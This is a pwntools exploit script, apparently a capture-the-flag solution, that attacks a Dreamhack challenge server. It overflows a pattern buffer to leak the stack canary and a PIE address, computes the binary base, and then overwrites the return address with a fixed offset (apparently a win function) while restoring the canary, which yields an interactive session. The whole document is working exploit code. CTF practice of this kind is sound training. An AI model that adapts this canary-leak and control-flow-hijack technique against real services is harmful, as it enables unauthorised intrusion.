#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./main',checksec=False)
#p = process()
p = remote('host3.dreamhack.games', 8273)
#gdb.attach(p,gdbscript='''
 #          main+265
 #          main+393
  #         main+480
   #        ''')
#input()
p.sendlineafter(b'Pattern: ',b'a'*11)
#input()
p.sendlineafter(b'length: ',b'1000')
p.recvuntil(b'a'*1001)
canary = u64(b'\x00'+ p.recv(7))
print("canary: ",hex(canary))
#input()
p.sendlineafter('Pattern: ',b'a'*43)
p.sendlineafter(b'length: ',b'1000')
p.recv(1032)
pie = u64(p.recv(6) + b'\x00\x00')
print("leak: ",hex(pie))
exe.address = pie - exe.sym.main
#win =  exe.sym.win
print("exe base: ",hex(exe.address))
input()
p.sendlineafter(b'Pattern: ',p64(exe.address+0x1275)*4)
p.sendlineafter(b'length: ',b'1000')

p.sendlineafter(b'Pattern: ',p64(canary)*2)
p.sendlineafter(b'length: ',b'1000')

p.sendlineafter(b'Pattern: ',b'test')
p.sendlineafter(b'length: ',b'1001')
p.interactive()
